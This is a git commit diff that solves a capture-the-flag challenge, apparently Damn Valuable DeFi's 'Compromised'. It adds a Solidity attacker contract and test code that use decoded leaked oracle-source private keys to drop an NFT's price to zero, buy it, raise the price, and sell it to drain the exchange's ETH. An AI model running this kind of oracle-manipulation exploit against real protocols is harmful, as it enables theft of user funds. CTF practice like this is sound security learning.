4cc32cd0e2cce81ccd79cd0d5406e40a04d972d3
GeorgiKostadinovPro <kostadinovgeorgi16@gmail.com>
2024-11-19 18:04:19 +0200

    Solve challenge 7. Compromised

--- test/compromised/Compromised.t.sol
+++ test/compromised/Compromised.t.sol
@@ -9,6 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {CompromisedAttacker} from "./CompromisedAttacker.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -20,14 +21,18 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
+
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
+    uint256[] prices = [
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE
+    ];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -50,10 +55,13 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
+            .oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
+            address(oracle)
+        );
         nft = exchange.token();
 
         vm.stopPrank();
@@ -75,7 +83,56 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        vm.prank(player);
+        CompromisedAttacker attacker = new CompromisedAttacker{
+            value: player.balance
+        }(recovery, address(nft), address(oracle), address(exchange));
+
+        /* 
+            Here we can prank the caller beacuse we have access to the sources private keys
+            By default we know from the description that we got a response from the server:
+
+            4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52
+            6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 
+            52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30
+
+            4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 
+            4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 
+            54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
+
+            The following data is the hex representation of the sources private keys
+
+            If you want to check for yourself you can easily follow these steps for decoding the hex
+            1. remove the empty spaces (create single string without spaces)
+            2. convert the hex symbols to ASCII ones
+            3. Call decodeBase64 with the converted string
+            Now you will receive the private key od sources 0 and 1
+            4. using ethers.js you can easily extract the public key:
+                const wallet = new ethers.Wallet(privateKey);
+                const publicKey = wallet.address;
+
+            Having control over the price oracles
+            We perform price change of the nft from 999 ETH to 0 ETH
+            Then we buy the nft 
+            So, now we can increase the nft price to 999 ETH
+            We can now sell the nft for 999 ETH
+            Finally, we can just transfer the 999 ETH for attacker to recovery
+        */
+
+        vm.prank(sources[0]);
+        oracle.postPrice(symbols[0], 0);
+        vm.prank(sources[1]);
+        oracle.postPrice(symbols[0], 0);
+
+        attacker.buy();
+
+        vm.prank(sources[0]);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
+        vm.prank(sources[1]);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
+
+        attacker.sell();
+        attacker.recover(INITIAL_NFT_PRICE);
     }
 
     /**
---
+++ test/compromised/CompromisedAttacker.sol
@@ -0,0 +1,54 @@
+// SPDX-License-Identifier: MIT
+pragma solidity =0.8.25;
+
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {Exchange} from "../../src/compromised/Exchange.sol";
+import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
+import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
+
+contract CompromisedAttacker is IERC721Receiver {
+    uint private nftId;
+    address private recovery;
+
+    DamnValuableNFT private nft;
+    Exchange private exchange;
+    TrustfulOracle private oracle;
+
+    constructor(
+        address _recovery,
+        address _nft,
+        address _oracle,
+        address _exchange
+    ) payable {
+        recovery = _recovery;
+        nft = DamnValuableNFT(_nft);
+        oracle = TrustfulOracle(_oracle);
+        exchange = Exchange(payable(_exchange));
+    }
+
+    receive() external payable {}
+
+    function buy() external payable {
+        nftId = exchange.buyOne{value: 1}();
+    }
+
+    function sell() external {
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+
+    function recover(uint amount) external {
+        (bool success, ) = payable(recovery).call{value: amount}("");
+        require(success, "Recovery is not successful");
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
